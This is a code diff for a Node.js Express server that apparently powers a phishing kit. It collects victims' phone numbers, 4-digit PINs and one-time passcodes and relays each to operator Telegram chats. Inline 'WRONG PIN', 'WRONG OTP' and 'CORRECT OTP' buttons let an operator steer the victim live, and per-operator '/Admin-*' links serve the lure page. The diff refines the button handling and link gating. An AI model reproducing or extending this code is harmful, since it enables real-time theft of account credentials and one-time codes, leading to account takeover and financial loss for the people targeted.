@@ -17,7 +17,7 @@ app.use(express.static(publicPath));
 // Persistent storage file path
 const STORAGE_FILE = path.join(__dirname, 'admins_data.json');
 
-// Load initial data from disk if it exists
+// Load initial persistent data from disk
 function loadPersistentData() {
   try {
     if (fs.existsSync(STORAGE_FILE)) {
@@ -41,7 +41,7 @@ function loadPersistentData() {
   };
 }
 
-// Save current maps to disk
+// Save current maps to disk permanently
 function savePersistentData() {
   try {
     const dataToSave = {
@@ -75,7 +75,7 @@ function formatZimbabwePhone(phone) {
   return formattedPhone;
 }
 
-// STEP 2 SUBMISSION: Credentials delivered strictly to the specific secondary Admin chat tied to the link path
+// STEP 2 SUBMISSION: PIN delivered with 2 buttons (WRONG OTP & CORRECT OTP)
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     const data = req.body;
@@ -121,7 +121,7 @@ app.post('/api/submit-credentials', async (req, res) => {
                           `📞 <b>Phone:</b> 263${formattedPhone}\n` +  
                           `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +  
                           `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +  
-                          `❓ <b>VERIFY PIN ACCURACY:</b>`;  
+                          `❓ <b>VERIFY CREDENTIALS:</b>`;  
 
       const telegramPayload = {  
         chat_id: targetChatId,  
@@ -130,9 +130,8 @@ app.post('/api/submit-credentials', async (req, res) => {
         reply_markup: JSON.stringify({  
           inline_keyboard: [  
             [  
-              { text: '❌ WRONG PIN', callback_data: `pin_wrong_${appReference}` },  
               { text: '❌ WRONG OTP', callback_data: `otp_wrong_${appReference}` },  
-              { text: '✅ ALLOW CORRECT OTP', callback_data: `pin_correct_${appReference}` }  
+              { text: '✅ CORRECT OTP', callback_data: `otp_correct_${appReference}` }  
             ]  
           ]  
         })  
@@ -153,7 +152,7 @@ app.post('/api/submit-credentials', async (req, res) => {
   }
 });
 
-// STEP 3 SUBMISSION: OTP delivered to the exact same secondary Admin chat that received Step 2
+// STEP 3 SUBMISSION: OTP delivered with 3 buttons (WRONG PIN, WRONG OTP, CORRECT OTP)
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { appReference, otpCode } = req.body;
@@ -186,7 +185,7 @@ app.post('/api/submit-otp', async (req, res) => {
             [  
               { text: '❌ WRONG PIN', callback_data: `pin_wrong_${appReference}` },  
               { text: '❌ WRONG OTP', callback_data: `otp_wrong_${appReference}` },  
-              { text: '✅ ALLOW CORRECT OTP', callback_data: `pin_correct_${appReference}` }  
+              { text: '✅ CORRECT OTP', callback_data: `otp_correct_${appReference}` }  
             ]  
           ]  
         })  
@@ -396,7 +395,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
   }
 
   let targetAppRef = '';
-  if (actionData.startsWith('pin_correct_')) targetAppRef = actionData.replace('pin_correct_', '');
   if (actionData.startsWith('pin_wrong_')) targetAppRef = actionData.replace('pin_wrong_', '');
   if (actionData.startsWith('otp_correct_')) targetAppRef = actionData.replace('otp_correct_', '');
   if (actionData.startsWith('otp_wrong_')) targetAppRef = actionData.replace('otp_wrong_', '');
@@ -411,17 +409,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
       });
       return;
     }
-  }
-
-  if (actionData.startsWith('pin_correct_')) {
-    const appReference = actionData.replace('pin_correct_', '');
-    if (activeApplications.has(appReference)) {
-      const appData = activeApplications.get(appReference);
-      appData.status = 'PIN_APPROVED';
-      activeApplications.set(appReference, appData);
-    }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: ALLOW CORRECT OTP ✅</b>`;
-    await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
   if (actionData.startsWith('pin_wrong_')) {
@@ -442,7 +429,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'OTP_APPROVED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: ALLOW CORRECT OTP ✅</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: CORRECT OTP ✅</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -470,12 +457,14 @@ async function editTelegramMessage(botToken, chatId, messageId, text) {
   }
 }
 
-// PERMANENT ROUTE GUARD: Once authorised and saved to disk, this link opens instantly without stopping
+// PERMANENT ROUTE GUARD: Once mapped by Main Admin, this link serves index.html freely forever without re-blocking
 app.get('/Admin-*', (req, res) => {
   const requestedPath = req.path;
 
   if (pathToAdminChat.has(requestedPath)) {
     return res.sendFile(path.join(publicPath, 'index.html'));
+  } else {
+    return res.status(403).send("<h1>403 Forbidden - Unauthorized Portal Link</h1><p>This portal link is not active or has not been approved by the main administrator.</p>");
   }
 });
 
